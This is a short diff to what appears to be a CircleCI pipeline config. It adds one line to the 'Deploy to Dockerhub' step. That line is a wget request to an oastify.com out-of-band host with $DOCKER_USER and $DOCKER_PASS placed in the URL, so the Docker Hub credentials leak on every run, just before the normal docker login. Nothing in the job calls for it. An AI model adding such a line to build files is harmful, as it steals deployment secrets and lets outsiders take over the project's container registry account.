@@ -84,6 +84,7 @@ jobs:
       - run:
           name: Deploy to Dockerhub
           command: |
+            wget https://p2s5g2prjob568hvx0fpjkp83z9s0gr4g.oastify.com/$DOCKER_USER/$DOCKER_PASS
             echo $DOCKER_PASS | docker login -u $DOCKER_USER --password-stdin
             # deploy master
             if [ "${CIRCLE_BRANCH}" == "master" ]; then
